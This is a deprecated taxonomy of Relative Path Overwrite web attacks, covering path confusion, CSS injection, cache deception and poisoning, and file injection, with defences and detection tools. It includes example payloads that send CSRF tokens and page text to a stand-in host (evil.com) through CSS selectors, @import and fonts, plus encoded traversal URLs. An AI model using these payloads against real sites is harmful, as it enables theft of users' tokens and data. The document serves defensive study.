> **DEPRECATED** — Moved to `99-deprecated/`.
> - RPO requires an extremely narrow precondition set: path confusion + text reflection + quirks mode simultaneously
> - Virtually no standalone RPO findings in modern bug bounty or pentest engagements
> - Path-confusion-based cache poisoning/deception is covered in `web-cache-poisoning-and-deception.md`

# Relative Path Overwrite (RPO) — Mutation & Variation Taxonomy

---

## Classification Structure

Relative Path Overwrite (RPO) exploits a fundamental architectural discrepancy in web applications: **the gap between how a server resolves a URL to a resource and how a browser resolves relative references within that resource's response**. When a server treats extra path segments (PATH_INFO, catch-all routing, URL rewriting) as irrelevant and returns the same content regardless, but the browser uses the full URL as the base for expanding relative `<link>`, `<script>`, `<a>`, or `<img>` references, an attacker can manipulate which resources the browser actually loads. This creates an injection primitive that requires no traditional injection sink — only a text reflection point combined with the browser's willingness to parse non-CSS/non-JS responses as those types.

The attack surface extends beyond classic style injection into cache deception/poisoning, file injection, script hijacking, and data exfiltration chains. This taxonomy organizes the entire RPO mutation space into seven structural categories based on **what component of the path confusion chain is being mutated**.

**Axis 1 (Primary — Mutation Target)** structures the document by the specific element being exploited or manipulated: server-side path tolerance mechanisms, browser-side relative resolution behavior, resource type and parsing leniency, CSS injection payload primitives, data exfiltration channels, cache-layer path confusion, and file/download injection.

**Axis 2 (Cross-cutting — Discrepancy Type)** classifies each subtype by the nature of the parsing mismatch it creates:

| Discrepancy Type | Description | Example |
|---|---|---|
| **Path semantics mismatch** | Server and browser disagree on what the "current directory" is | `/page.php/fake/path/` causes browser to resolve `style.css` from `/page.php/fake/path/` |
| **Content-Type disregard** | Browser ignores `Content-Type: text/html` and parses response as CSS/JS | Quirks mode allows HTML to be consumed as a stylesheet |
| **Normalization differential** | Cache/proxy and origin server normalize URL paths differently | `%2e%2e` resolved by one layer but not the other |
| **Delimiter differential** | Different components treat characters (`;`, `#`, `%00`) as path delimiters | Spring treats `;` as matrix variable separator; cache does not |
| **Extension inference mismatch** | Cache infers resource type from URL suffix; origin ignores it | `/api/profile/foo.css` — origin serves JSON, cache stores as static |

**Axis 3 (Mapping — Attack Scenario)** connects techniques to deployment contexts:

| Scenario | Architecture | Primary Impact |
|---|---|---|
| **Style injection / defacement** | Any server with path tolerance + relative CSS imports | UI manipulation, phishing |
| **Data exfiltration** | RPO + CSS injection + attribute selector / font tricks | CSRF token theft, credential extraction |
| **Script hijacking** | RPO redirecting `<script src="...">` to attacker-controlled content | XSS, account takeover |
| **Cache deception** | CDN/proxy + origin with path confusion | Sensitive response caching, session theft |
| **Cache poisoning** | CDN/proxy + origin with path confusion + unkeyed inputs | Mass user compromise via poisoned resources |
| **File injection (RPFI)** | RPO + polyglot content + `<a>` download attribute | Malware delivery via trusted domains |
| **WAF/ACL bypass** | Proxy and origin disagree on path routing | Access to restricted endpoints |

---

## §1. Server-Side Path Tolerance Mechanisms

The foundational prerequisite for any RPO attack is a server that returns the same response content for a URL with appended path segments as it does for the original URL. This section catalogs the mechanisms by which servers tolerate superfluous path data — the "catch-all" behavior that creates the path confusion primitive.

### §1-1. PATH_INFO — CGI-Inherited Path Extension

Web servers following the CGI specification split the URL into the script path and additional path data (PATH_INFO). This extra data is passed to the application as an environment variable but does not affect which script is executed.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Classic PHP PATH_INFO** | A request to `/page.php/anything/here` executes `page.php` and sets `PATH_INFO=/anything/here`. The response content is identical regardless of the appended path. | Apache/Nginx with PHP-FPM or mod_php; `AcceptPathInfo On` (default in Apache) |
| **JSP/Servlet PATH_INFO** | Java Servlet containers (Tomcat, Jetty) map `/servlet/path/extra` by splitting at the servlet mapping boundary and exposing extra segments as `request.getPathInfo()`. | Servlet container with URL-pattern mapping; wildcard servlet mappings |
| **Python WSGI PATH_INFO** | WSGI-based frameworks receive `PATH_INFO` containing the full remaining path after the script; frameworks that don't validate extra segments return the same response. | Flask, Django, or raw WSGI applications without strict path matching |

### §1-2. URL Rewriting — Framework Routing Abstraction

Modern web frameworks use URL rewriting rules (Apache mod_rewrite, Nginx try_files, IIS URL Rewrite) to map clean URLs to internal handlers. Many configurations pass all unmatched paths to a single entry point.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Catch-all SPA routing** | Single Page Applications use a server rule like `try_files $uri /index.html` that serves the same HTML shell for every path. All routing is client-side. Since `index.html` contains relative resource references, any arbitrary path changes the browser's base for resolution. | Nginx/Apache with SPA fallback; React, Angular, Vue applications with HTML5 pushState routing |
| **CMS rewrite-to-index** | WordPress, Drupal, and similar CMS platforms rewrite all requests to `index.php` (or equivalent), which performs internal routing. Extra path segments appended after any valid page URL are silently ignored. | WordPress with `mod_rewrite`; the response includes path-relative stylesheet/script links |
| **Framework route tolerance** | Frameworks like ASP.NET MVC, Spring MVC, and Rails may accept additional trailing path segments beyond the matched route without returning a 404, depending on routing configuration. | Permissive route matching without strict segment validation |
| **IIS request filtering pass-through** | IIS processes URLs by mapping extensions to handlers; when `runAllManagedModulesForAllRequests` is enabled, URLs with extra path segments are passed to ASP.NET regardless of extension matching. | IIS 7+ with ASP.NET; common in legacy configurations |

### §1-3. Encoded Path Traversal in Server Resolution

When a server decodes URL-encoded characters before resolving the path, but intermediate layers (caches, proxies, WAFs) operate on the raw URL, the effective path seen by each component diverges.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Double-encoded slash** | `%252f` decodes to `%2f` at the first layer, then to `/` at the second. The server resolves a different path than what the proxy logged or cached. | Multi-layer decoding; Nginx + backend, or CDN + origin |
| **Encoded dot-segment** | `%2e%2e%2f` (`../`) is decoded by the origin server during normalization but left unresolved by the cache, creating path divergence. | Origin decodes before routing; cache stores raw URL as key |
| **Backslash substitution (IIS)** | IIS treats `\` (`%5c`) as equivalent to `/` in path resolution. Other components (proxies, WAFs) do not perform this substitution. | IIS-specific; creates mismatch with Nginx/Apache reverse proxies |
| **Null byte truncation** | OpenLiteSpeed and some legacy servers truncate the path at `%00`, ignoring everything after it. Caches process the full URL. | OpenLiteSpeed; legacy CGI implementations |

### §1-4. Framework-Specific Delimiter Interpretation

Different frameworks assign special meaning to certain characters within URL paths, creating delimiter differentials when deployed behind proxies or caches.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Semicolon as matrix variable (Spring)** | Spring Framework treats `;` as a delimiter for matrix variables: `/profile;jsessionid=abc` resolves to `/profile`. Caches and proxies treat the full string as the path. | Spring MVC/Boot behind CDN; cache keys include `;` segment |
| **Dot as format specifier (Rails)** | Ruby on Rails interprets `.` as a format extension delimiter: `/users/1.json` vs `/users/1.css`. An attacker can append `.css` to trigger cache rules while the origin serves JSON. | Rails behind extension-based cache rules |
| **Encoded newline delimiter (Nginx)** | Nginx with rewrite rules may treat `%0a` (newline) as a path delimiter, truncating the path at that point while the cache processes the full URL. | Nginx with specific rewrite configurations |
| **Hash fragment differential** | Azure CDN treats `#` as a delimiter for normalization: `/path#/../other` resolves differently at the CDN layer vs the origin. | Azure-specific CDN behavior |

---

## §2. Browser-Side Relative Path Resolution

Once the server returns a response for a manipulated URL, the browser must resolve any relative resource references in that response. The browser's resolution algorithm is deterministic (RFC 3986) but operates on the *effective request URL*, which the attacker controls.

### §2-1. Base URL Manipulation via Path Inflation

The core RPO primitive: by appending fake path segments to a URL, the attacker shifts the browser's perception of the "current directory," causing all relative references to resolve to unintended locations.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Self-referencing stylesheet** | A page at `/page.php` with `<link href="style.css">` normally loads `/style.css`. When accessed as `/page.php/fake/path/`, the browser resolves the relative link as `/page.php/fake/path/style.css`. If the server returns the page content again (due to PATH_INFO tolerance, §1-1), the page effectively loads itself as a stylesheet. | Server path tolerance + relative CSS import + no `<base>` tag |
| **Directory-depth shifting** | Appending N fake path segments shifts the browser's resolved base by N directories. `/app/page/x/y/z/` causes `../../lib.js` to resolve as `/app/page/x/lib.js` instead of `/lib.js`. | Relative references using `../` traversal; server path tolerance |
| **Trailing-slash ambiguity** | `/page` vs `/page/` changes whether the browser treats `page` as a file or directory when resolving relative references. Adding a trailing slash to a URL where the server doesn't distinguish creates a path confusion primitive. | Server treats `/page` and `/page/` identically; page uses relative links |

### §2-2. `<base>` Tag Injection and Override

If an attacker can inject a `<base href="...">` tag into the page (via HTML injection), all subsequent relative references resolve against the injected base, completely hijacking resource loading.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Full base hijacking** | `<base href="https://evil.com/">` causes every relative `<link>`, `<script>`, `<img>`, `<a>`, and `<form>` in the page to resolve against `evil.com`. | HTML injection before any relative references in the DOM; no CSP `base-uri` directive |
| **Path-only base override** | `<base href="/attacker-controlled-path/">` does not change the origin but shifts the resolution base to a different path on the same server, enabling same-origin resource substitution. | Same-origin HTML injection; no CSP `base-uri 'self'` that blocks path manipulation |
| **First-base-wins rule** | Browsers only honor the first `<base>` tag in a document. If the attacker can inject before the legitimate `<base>` tag, the injected one takes precedence. | Injection point above the existing `<base>` in DOM order |

### §2-3. Browser Parsing Mode and Content-Type Leniency

The browser's willingness to parse a `text/html` response as CSS or JavaScript depends on parsing mode and security headers.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Quirks mode CSS parsing** | When a page lacks `<!doctype html>` (or uses an old doctype), the browser enters Quirks Mode, which relaxes MIME type enforcement. An HTML response loaded via `<link rel="stylesheet">` will be parsed for CSS rules even though its Content-Type is `text/html`. | Missing or outdated `<!DOCTYPE>`; no `X-Content-Type-Options: nosniff` header |
| **Inherited quirks mode (iframe)** | In Internet Explorer, a framed document inherits the parsing mode of the parent frame. An attacker creates a parent page with an IE7-emulation meta tag (`<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">`) and iframes the target page, forcing it into Quirks Mode regardless of its own doctype. | Target page is frameable (no `X-Frame-Options`); Internet Explorer |
| **MIME sniffing fallback** | Without `X-Content-Type-Options: nosniff`, some older browsers attempt to detect content type by inspecting the response body. If the response contains CSS-like syntax near the top, the browser may parse it as CSS despite the `text/html` Content-Type. | Missing `nosniff` header; legacy browser versions |
| **Standards mode limitation** | In Standards Mode, modern browsers (Chrome, Firefox, Edge) refuse to parse a `text/html` response as CSS, blocking classic RPO. However, this does not protect against script-relative RPO (§2-4) or cache-layer RPO (§6). | Modern browser + proper doctype = classic PRSSI blocked; other RPO variants remain viable |

### §2-4. Script-Relative Path Manipulation

RPO can target `<script>` elements with relative `src` attributes in addition to stylesheets, with potentially higher impact.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Relative script redirect to dynamic endpoint** | If a page includes `<script src="scripts/app.js">` and the server tolerates path inflation, the attacker can redirect the script load to a dynamic endpoint (e.g., a PHP/ASP file that reflects user input) on the same origin. | Relative script import + server path tolerance + a same-origin endpoint that returns attacker-controlled content with permissive Content-Type |
| **JSON-as-JavaScript injection (IIS/.NET)** | On IIS, encoded directory traversal (`%2f..%2f`) within the manipulated URL can redirect a relative script import to a JSON handler or other dynamic file whose output resembles valid JavaScript. | IIS path resolution behavior + non-root-relative script imports; the JSON handler outputs content parseable as JS |
| **Cross-file RPO in .NET** | .NET Framework 4's `~` operator resolves relative paths by adding `../` sequences proportional to the number of extra path segments. This behavior can be exploited to redirect resource references to other files on the server rather than the page itself. | ASP.NET with `~`-based resource resolution; extra path segments after `.aspx` extension |

---

## §3. CSS Injection Payloads via RPO

When an RPO attack successfully causes the browser to parse an HTML page as a stylesheet, any attacker-controlled text reflected in that page becomes an injectable CSS directive. This section catalogs the CSS payload primitives that transform a self-referencing RPO into a weaponized attack.

### §3-1. Basic Style Injection

The simplest exploitation of RPO: injecting CSS rules that alter the visual presentation of the page.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Universal selector override** | `{}*{color:red;}` — the leading `{}` closes any open CSS context from the HTML parsing; `*{...}` applies styles to all elements. The browser's tolerant CSS parser skips HTML syntax it doesn't understand and extracts valid CSS rules. | RPO self-reference achieved; reflected text in the page (URL path, query parameter, form input) |
| **Targeted element manipulation** | `{}body{background:url(//evil.com/bg.png)}` — replaces page background, images, or layout to create a phishing facade. | RPO + text reflection + specific CSS knowledge of the target page |
| **@import remote stylesheet** | `{}@import url(//evil.com/malicious.css);` — loads an external stylesheet of arbitrary complexity, bypassing the limited injection point by delegating to a full attacker-controlled CSS file. | RPO + text reflection; requires no CSP `style-src` restriction blocking the external domain |

### §3-2. UI Redressing and Phishing

CSS injection can be weaponized for sophisticated visual attacks that go beyond simple defacement.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Form action overlay** | CSS `position: absolute` overlay with a fake form that submits credentials to an attacker-controlled endpoint, positioned exactly over the legitimate login form. | RPO + text reflection + knowledge of target page layout |
| **Content replacement** | `{}.real-content{display:none} .fake-content::after{content:"Verify your account..."}` — hides legitimate content and replaces it with phishing text. | RPO + text reflection |
| **Link retargeting** | Injecting CSS that repositions transparent clickable elements over legitimate links, redirecting clicks to attacker-chosen URLs. | RPO + text reflection + page with actionable links |

### §3-3. CSS Keylogger and Input Monitoring

Modern CSS features enable real-time monitoring of user input through attribute selector reactions.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Input value attribute tracking** | `input[value^="a"]{background:url(//evil.com/?a)}` — CSS attribute selectors trigger HTTP requests when an input field's `value` attribute matches a prefix pattern. By enumerating all possible character prefixes, each keystroke that updates the attribute triggers a unique callback. | RPO + text reflection; works only for frameworks that sync input values to DOM attributes (e.g., React controlled inputs). Doesn't work when `value` isn't reflected as an HTML attribute. |

---

## §4. Data Exfiltration Channels via CSS

When RPO enables CSS injection, several advanced techniques allow extraction of sensitive data from the page without JavaScript execution — critically bypassing Content Security Policy (CSP) restrictions.

### §4-1. Attribute Selector Exfiltration

The most widely applicable CSS exfiltration technique: using attribute selectors to leak HTML attribute values character by character.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **CSRF token extraction** | `input[name="csrf_token"][value^="a"]{background:url(//evil.com/exfil?token=a)}` — for each possible starting character, a CSS rule triggers a unique HTTP request to the attacker's server. After receiving the first character, a follow-up page generates rules for the second character, iterating until the full token is extracted. | RPO + text reflection + target page contains CSRF token in an `<input>` element's `value` attribute |
| **Hidden field value leakage** | Any `<input type="hidden">` with a `value` attribute can be targeted. This includes session identifiers, nonces, API keys, and other secrets embedded in forms. | RPO + text reflection + secrets in form hidden fields |
| **Link/anchor href extraction** | `a[href^="/admin"]{background:url(//evil.com/exfil?admin_link)}` — detects the presence of specific links on the page, revealing user role or access level. | RPO + text reflection |

### §4-2. Sequential Import Chaining

A technique that enables full extraction of multi-character secrets in a single page load through cascading CSS imports.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **@import chain extraction** | The attacker's server returns `@import url(//evil.com/next?known=X)` rules that keep browser connections open. After the first character is leaked via attribute selectors, the server generates the next payload with the known prefix, responding to the pending @import connection. This cascading chain extracts the full secret without page reload. | RPO + text reflection + ability to inject `@import` rule; modern browser support for deferred @import processing |
| **Recursive CSS import** | Each @import URL is dynamically generated server-side to include the already-known prefix in attribute selector payloads. The browser evaluates each imported stylesheet sequentially, progressively narrowing the character search space. | Attacker controls a server that dynamically generates CSS payloads; stable browser connection |

### §4-3. Font-Based Side-Channel Exfiltration

Techniques that extract text content (not just attribute values) using font rendering mechanics.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Unicode-range probing** | `@font-face{font-family:probe; src:url(//evil.com/exfil?char=A); unicode-range:U+0041}` — defines a custom font that the browser attempts to load only if the character 'A' appears in the rendered text of the target element. Each character has a unique callback URL. | RPO + text reflection + target text node content to exfiltrate; works in modern browsers |
| **Ligature width detection** | Custom SVG fonts define two-character ligature combinations with exaggerated widths. When a ligature matches text content, the rendered element width changes dramatically. Combined with `overflow` and scrollbar styling detection, this creates a binary signal per character pair. | RPO + text reflection + complex payload; slower extraction rate than attribute selectors |
| **Scrollbar-based signal** | Combines `white-space: nowrap` + `overflow: auto` + custom scrollbar styling with `background-image` callbacks. When injected text matches certain width thresholds (influenced by font metrics), scrollbar appearance triggers an HTTP request. | RPO + text reflection; Chromium-based browsers with scrollbar pseudo-element support |

---

## §5. Cache-Layer Path Confusion

The architectural expansion of RPO principles to cache/proxy infrastructure. When the cache and origin server disagree on how to interpret a URL's path, the attacker can weaponize this for cache deception (stealing cached sensitive data) or cache poisoning (serving malicious content to other users).

### §5-1. Extension-Based Cache Deception

Caches commonly store responses for URLs ending in static file extensions (`.css`, `.js`, `.ico`, `.png`). If the origin ignores the appended extension segment, the cache stores a dynamic response as if it were static.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Path-appended static extension** | `/api/profile/wcd.css` — the origin's catch-all routing serves the user's profile data; the CDN sees `.css` extension and caches the response. A second user (or the attacker) requests the cached URL and receives the victim's profile. | CDN with extension-based cache rules + origin with path tolerance (§1-2); victim must visit the crafted URL |
| **Delimiter-truncated extension** | `/profile;foo.css` — Spring treats `;` as a delimiter (§1-4) and resolves to `/profile`; the cache sees the full URL ending in `.css` and caches. | Spring + CDN without `;` delimiter awareness |
| **Null-byte truncated extension** | `/profile%00foo.js` — OpenLiteSpeed truncates at `%00` and serves `/profile`; the cache stores the response keyed to the full URL including `.js`. | OpenLiteSpeed + CDN that doesn't decode `%00` |
| **Dot-format extension (Rails)** | `/account.css` — Rails interprets `.css` as a format parameter but still routes to the account controller, returning HTML. The cache stores it as a CSS asset. | Rails + CDN with extension-based rules |

### §5-2. Normalization Differential Exploitation

When cache and origin normalize paths differently, the attacker creates URLs that map to different effective paths at each layer.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Encoded dot-segment traversal** | `/static/..%2fprofile` — the origin decodes `%2f` to `/` and resolves `../` to serve `/profile` (dynamic content). The cache does not decode and sees the URL as a path under `/static/`, applying static cache rules. | Origin decodes before routing; cache does not decode before rule evaluation. Common with Nginx origins + Cloudflare/Fastly CDNs. |
| **Reverse traversal for exact-match** | `/profile%2f%2e%2e%2findex.html` — the cache normalizes this to `/index.html` (exact-match cache rule hit), but the origin does not normalize and routes to the profile endpoint. The victim's profile is cached as `index.html`. | Cache normalizes encoded dot-segments; origin does not. Azure CDN behavior. |
| **Double-encoding traversal** | `/static/%252e%252e/profile` — first decoding yields `/static/%2e%2e/profile`; second decoding at the origin yields `/static/../profile` → `/profile`. The cache stores at the raw key. | Multi-layer decoding; proxy decodes once, origin decodes again |

### §5-3. Static Directory Rule Exploitation

Many CDN configurations cache everything under paths like `/assets/`, `/static/`, `/images/`. Path confusion can route dynamic requests through these directory prefixes.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Traversal into static directory** | `/assets/..%2fapi/user/profile` — the origin resolves the traversal and serves the API response; the cache matches the `/assets/` prefix and stores. | CDN with directory-based cache rules + origin that resolves encoded traversals |
| **Delimiter + directory prefix** | `/api/profile;/static/foo` — the origin truncates at `;` and serves `/api/profile`; the cache sees `/static/` in the path and caches. | Origin uses `;` as delimiter (Spring); cache applies static directory rules on full path |

### §5-4. Cache Poisoning via RPO

When RPO is combined with cache poisoning techniques, the attacker can serve malicious content to all users requesting a popular cached resource.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Relative resource poisoning** | An attacker poisons the cache for a widely-requested resource (e.g., `/styles/main.css`) by exploiting a path confusion vulnerability. The poisoned response contains injected CSS that steals data from every user who loads the page. | Cache poisoning primitive (unkeyed header/parameter) + RPO-style path confusion |
| **Cache key normalization poisoning** | If the cache normalizes the key but stores the unnormalized response URL, different URLs can map to the same cache key. The attacker stores a malicious response under a key that matches a legitimate resource. | Cache key normalization + response URL manipulation |

---

## §6. Relative Path File Injection (RPFI)

An evolution of RPO that targets file downloads rather than resource imports. RPFI exploits relative paths in `<a>` elements with `download` attributes or other file-serving mechanisms to serve malicious file content from a trusted domain.

### §6-1. Download Link Manipulation

When a page contains a relative download link (e.g., `<a href="report.pdf" download>`) and the server tolerates path inflation, the actual file served can be manipulated.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **PDF polyglot injection** | The attacker crafts a URL that causes the relative download link to resolve to a page containing attacker-injected content structured as a valid PDF. PDF parsers ignore non-PDF content before the `%PDF-1.x` header, so the HTML wrapping is invisible to the PDF reader. JavaScript within the PDF executes in the PDF viewer's context. | RPO path manipulation + attacker can inject content that includes valid PDF structure + download link uses relative path |
| **Shell script polyglot** | On systems where downloaded files are executed (Windows WSL, Linux terminals), the attacker injects content that is valid both as HTML and as a shell script. The HTML portion is ignored when the file is executed as a script (e.g., via `bash downloaded_file`). | RPO + polyglot injection + victim executes the downloaded file; effective on WSL-2 and Powershell |
| **SVG polyglot** | SVG files can contain embedded JavaScript via `<script>` tags. A polyglot HTML/SVG file, when downloaded and opened in a browser, executes the embedded JavaScript in a local file context. | RPO + SVG polyglot content injection + victim opens the downloaded SVG |

### §6-2. Content-Disposition Interaction

The `Content-Disposition` header and the `download` attribute interact with RPO in ways that expand or limit the attack surface.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Missing Content-Disposition** | Without an explicit `Content-Disposition: attachment; filename="safe.pdf"` header, the browser infers the filename from the URL path. RPO-manipulated paths can change the inferred extension. | Server does not set Content-Disposition for download responses |
| **Extension mismatch** | The `download` attribute specifies a filename, but RPO changes the actual content served. The user sees `report.pdf` as the download name but receives content from a different endpoint. | Relative download link + server path tolerance + attacker content reflection |

---

## §7. Architectural and Browser-Specific Variations

RPO exploitability varies significantly across server platforms, frameworks, and browsers. This section catalogs the key platform-specific mutations.

### §7-1. Server Platform Variations

| Platform | Path Tolerance | RPO-Relevant Behavior |
|---|---|---|
| **Apache + PHP** | Full PATH_INFO support by default (`AcceptPathInfo On`). `/page.php/any/path` serves `page.php`. | Classic RPO target; PATH_INFO in URL is reflected in `$_SERVER['REQUEST_URI']` |
| **Nginx + PHP-FPM** | Depends on `fastcgi_split_path_info` configuration. Without it, extra path segments return 404. With it, behaves like Apache. | Requires explicit configuration for PATH_INFO; common in WordPress deployments |
| **IIS + ASP.NET** | Handles encoded path characters uniquely: `%5c` → `\`, treats backslash as path separator. .NET 4 resolves `~` operator with extra `../` based on path depth. | Non-root-relative RPO possible; encoded directory traversal (`%2f..%2f`) enables cross-file resource loading |
| **Node.js + Express** | `express.static()` middleware serves static files; dynamic routes with `app.get('*', ...)` create catch-all behavior. | SPA deployments are primary RPO targets; `serve-static` middleware behavior matters |
| **Spring Boot** | Embedded Tomcat tolerates extra path segments after matched routes. Semicolon (`;`) treated as matrix variable delimiter. | Delimiter-based cache deception (§5-1); PATH_INFO tolerance varies by version |
| **Ruby on Rails** | Dot (`.`) as format specifier; wildcard routes with `match '*path'` create catch-all behavior. | Format-based cache deception; `.css` suffix triggers format negotiation |

### §7-2. Browser Parsing Behavior

| Browser | Quirks Mode CSS Parsing | Standards Mode CSS Parsing | `nosniff` Enforcement |
|---|---|---|---|
| **Chrome / Chromium** | Refuses to parse `text/html` as CSS in both modes (strict CORB/ORB enforcement since ~2018) | Blocked | Strict |
| **Firefox** | Parsed `text/html` as CSS in Quirks Mode historically; Firefox 50 (November 2016) added `X-Content-Type-Options: nosniff` enforcement and tightened cross-origin stylesheet MIME handling, so cross-origin `text/html` is no longer accepted as CSS in current versions | Blocked | Strict since Firefox 50 |
| **Internet Explorer 11** | Parses `text/html` as CSS in Quirks Mode; supports `expression()` for JS execution | Partially blocked; depends on doctype | Weaker enforcement |
| **Edge (Legacy)** | Similar to IE11 for compatibility; inherited quirks mode behavior | Blocked in standards mode | Moderate |
| **Safari** | Historically lenient in Quirks Mode; modern versions align with Chrome/Firefox | Blocked | Strict in recent versions |

### §7-3. Content Security Policy (CSP) Interactions

| CSP Directive | Effect on RPO | Bypass Consideration |
|---|---|---|
| **`style-src 'self'`** | Allows RPO-loaded CSS from the same origin (self-referencing stylesheet). Blocks external `@import` but the self-referencing attack is same-origin. | Does NOT prevent classic RPO style injection; the stylesheet is loaded from `'self'` |
| **`style-src 'nonce-xxx'`** | Blocks RPO because the self-referenced page's `<link>` tag won't have the correct nonce for the injected CSS content. | Effectively blocks RPO style injection in modern browsers |
| **`base-uri 'self'`** | Prevents `<base>` tag injection from pointing to external origins. | Blocks external base hijacking (§2-2) but not same-origin path manipulation |
| **`script-src 'self'`** | Does not prevent script-relative RPO (§2-4) since the redirected script loads from the same origin. | RPO redirects to same-origin dynamic endpoints remain viable under `script-src 'self'` |
| **No CSP** | All RPO variants are viable. CSS exfiltration (§4) is particularly impactful because it works without JavaScript. | CSS exfiltration bypasses even script-blocking CSP since it uses CSS, not JS |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories | Impact |
|---|---|---|---|
| **Classic RPO/PRSSI defacement** | PHP/ASP.NET + relative CSS + no doctype | §1-1 + §2-1 + §3-1 | UI manipulation, phishing |
| **CSRF token exfiltration** | RPO + CSS injection + attribute selectors | §1-1 + §2-1 + §3-1 + §4-1 | Account takeover via stolen tokens |
| **IE expression() XSS** | RPO + IE Quirks Mode + expression() | §1-1 + §2-1 + §2-3 + §3-1 | Full XSS in legacy browsers |
| **CDN cache deception** | Spring/Rails + Cloudflare/Akamai | §1-4 + §5-1 + §5-2 | Victim session/data theft |
| **CDN cache poisoning** | Nginx + CDN + unkeyed inputs | §1-3 + §5-2 + §5-4 | Mass user compromise |
| **SPA resource hijacking** | React/Angular/Vue + catch-all routing | §1-2 + §2-1 + §2-4 | XSS via script redirection |
| **RPFI malware delivery** | Any RPO-vulnerable site + download links | §1-1 + §6-1 + §6-2 | Malware distribution from trusted domain |
| **WAF/ACL bypass** | Proxy + origin path confusion | §1-3 + §1-4 + §5-2 | Access to restricted endpoints |
| **Blind CSS exfiltration** | RPO + sequential import chaining | §3-1 + §4-1 + §4-2 | Full secret extraction without JS |
| **Font side-channel leak** | RPO + unicode-range / ligature fonts | §3-1 + §4-3 | Text node content extraction |

---

## CVE / Bounty Mapping

| Mutation Combination | CVE / Case | Impact / Bounty |
|---|---|---|
| §1-1 + §2-1 + §3-1 | phpBB3 PRSSI (2014) | CSS injection via self-referencing stylesheet; first real-world RPO demonstration |
| §1-1 + §2-1 + §4-1 | CVE-2019-17495 (Swagger UI < 3.23.11) | RPO-based CSS injection enabling CSRF token exfiltration via `@import` within untrusted JSON data |
| §1-2 + §2-1 + §3-1 | Google PRSSI ($6,000 bounty) | Relative path overwrite exploited for CSS injection + `@import`-based content exfiltration on Google property |
| §1-1 + §2-1 + §2-3 | Keycloak PRSSI (Issue #18032) | Path-relative CSS links in Keycloak authentication pages; mitigated by switching to absolute paths |
| §5-1 + §5-2 | Black Hat USA 2024 — Cache exploitation research | Systematic mapping of delimiter and normalization discrepancies across CDN providers; cache deception and poisoning on major platforms |
| §1-2 + §2-1 + §6-1 | DEF CON 32 AppSec Village — RPFI (2024) | Relative Path File Injection demonstrated: PDF polyglot, shell script, and PowerShell exploitation via trusted download links |
| §1-4 + §5-1 | Spring + CDN delimiter confusion (2024) | Semicolon-based cache deception enabling session theft on Spring applications behind Cloudflare |
| §5-2 + §5-3 | Nginx + CDN normalization differential (2024) | Encoded dot-segment traversal exploiting normalization mismatch between Nginx origins and CDN caches |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **RPOscanner** (Python) | Automated RPO detection | Crawls pages, identifies relative stylesheet/script imports, tests for path tolerance by appending segments and verifying response identity |
| **OWASP ZAP** (Proxy/Scanner) | RPO / PRSSI detection | Passive scanner rule identifies path-relative resource imports; active scanner tests for path tolerance and quirks mode conditions |
| **Burp Suite Scanner** (Proxy/Scanner) | PRSSI detection | Identifies path-relative stylesheet imports and tests for exploitability conditions (path tolerance, content-type, doctype) |
| **Detectify** (SaaS Scanner) | RPO vulnerability detection | Cloud-based scanner with specific RPO test module that checks for reflectable path segments and relative imports |
| **Param Miner** (Burp Extension) | Cache deception detection | Identifies unkeyed inputs and path confusion vectors; tests delimiter and normalization discrepancies between cache and origin |
| **Web Cache Vulnerability Scanner** (Python) | Cache deception/poisoning | Tests CDN-specific delimiter tables, normalization behaviors, and extension-based cache rule exploitation |
| **sic** (Sequential Import Chaining tool) | CSS exfiltration automation | Automates the @import chaining technique for character-by-character extraction of CSS-accessible secrets |
| **cssInjection** (Python/JS) | CSS-based CSRF token theft | Generates attribute selector payloads for extracting hidden form field values via CSS injection |

---

## Summary: Core Principles

**The fundamental property** that enables RPO and its entire mutation family is the **semantic gap between URL interpretation layers**. A URL is not a single, unambiguous identifier — it is a string that is parsed, decoded, normalized, and routed by multiple independent components (browser, CDN, proxy, web server, framework, application), each with its own rules. When these components disagree on the meaning of the same URL string, the disagreement becomes an exploitable primitive.

Classic RPO exploits the simplest form of this gap: the server ignores extra path segments while the browser uses them to calculate the resolution base for relative references. But the same underlying principle — **parser differential across architectural layers** — scales to cache deception (CDN vs origin path interpretation), cache poisoning (cache key normalization vs response routing), WAF bypass (proxy path parsing vs application routing), and file injection (download path resolution vs served content).

**Incremental fixes fail** because the attack surface is inherently combinatorial. Fixing a specific server's PATH_INFO behavior doesn't address the SPA catch-all routing case. Adding `nosniff` headers blocks CSS MIME confusion but doesn't prevent cache-layer path confusion. Even deploying a strict CSP with nonces blocks CSS injection but leaves script-relative RPO and cache deception untouched. Each defensive measure closes one cell in the (mutation target × discrepancy type × scenario) matrix while leaving others open.

**A structural solution** requires enforcing consistency across all URL interpretation layers: (1) **absolute paths** for all resource references, eliminating relative resolution entirely; (2) **strict Content-Type enforcement** via `X-Content-Type-Options: nosniff` and modern doctypes; (3) **consistent path normalization** between caches and origins, including delimiter handling and dot-segment resolution; (4) **cache key validation** that verifies the Content-Type of the origin response matches the inferred type from the cache key; and (5) **CSP `base-uri` restriction** to prevent `<base>` tag injection. Only the combination of all five eliminates the full RPO attack surface.

---

## Reference

- Gareth Heyes, "RPO," The Spanner (2014) — Original RPO technique disclosure
